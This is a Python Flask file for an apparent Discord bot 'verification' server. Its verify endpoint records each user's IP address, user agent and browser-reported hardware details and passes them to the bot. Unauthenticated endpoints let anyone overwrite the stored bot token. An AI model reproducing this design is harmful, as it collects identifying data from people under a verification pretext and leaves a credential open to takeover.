from flask import Flask, request, render_template, jsonify
import sqlite3
import datetime
import os
import sys

# Ensure templates folder is found correctly
template_dir = os.path.abspath('templates')
app = Flask(__name__, template_folder=template_dir)

DB_FILE = "bot_data.db"

def log_to_db(user_id, username, ip, user_agent, hardware):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO drac_logs (timestamp, user_id, username, ip, user_agent, hardware) VALUES (?, ?, ?, ?, ?, ?)",
                  (datetime.datetime.now().isoformat(), user_id, username, ip, user_agent, hardware))
        conn.commit()
        
        # Signal the bot - use double pipe for safer splitting
        data_str = f"{username}||{ip}||{hardware}"
        c.execute("INSERT INTO settings (key, value) VALUES (?, ?)", 
                  (f"log_queue_{user_id}_{datetime.datetime.now().timestamp()}", data_str))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB Error: {e}")

@app.route('/')
def home():
    return "🐲 Drac Services Verification Server is Running."

@app.route('/verify/<int:user_id>/<username>')
def verify_page(user_id, username):
    return render_template('verify.html', user_id=user_id, username=username)

@app.route('/api/verify', methods=['POST'])
def api_verify():
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username')
    # Get real IP behind Replit proxy
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    hardware = data.get('hardware', 'Unknown')
    
    log_to_db(user_id, username, ip, user_agent, hardware)
    return jsonify({"status": "success"})

@app.route('/token')
def token_page():
    return render_template('token.html')

@app.route('/api/token', methods=['POST'])
def save_token():
    data = request.json
    token = data.get('token', '').strip()
    if not token:
        return jsonify({"status": "error", "message": "Token cannot be empty"}), 400
    
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", 
                  ("bot_token", token))
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "message": "Token saved successfully"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/token', methods=['GET'])
def get_token():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT value FROM settings WHERE key = ?", ("bot_token",))
        res = c.fetchone()
        conn.close()
        if res:
            token = res[0]
            masked = token[:10] + '*' * (len(token) - 14) + token[-4:] if len(token) > 14 else '*' * len(token)
            return jsonify({"status": "success", "token_masked": masked, "token_exists": True})
        return jsonify({"status": "success", "token_exists": False})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Initialize log table if not exists
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.execute('''CREATE TABLE IF NOT EXISTS drac_logs 
                        (timestamp TEXT, user_id INTEGER, username TEXT, ip TEXT, user_agent TEXT, hardware TEXT)''')
        conn.close()
    except Exception as e:
        print(f"Init Error: {e}")
        
    print("Starting Drac Services on port 5000...")
    app.run(host='0.0.0.0', port=5000)
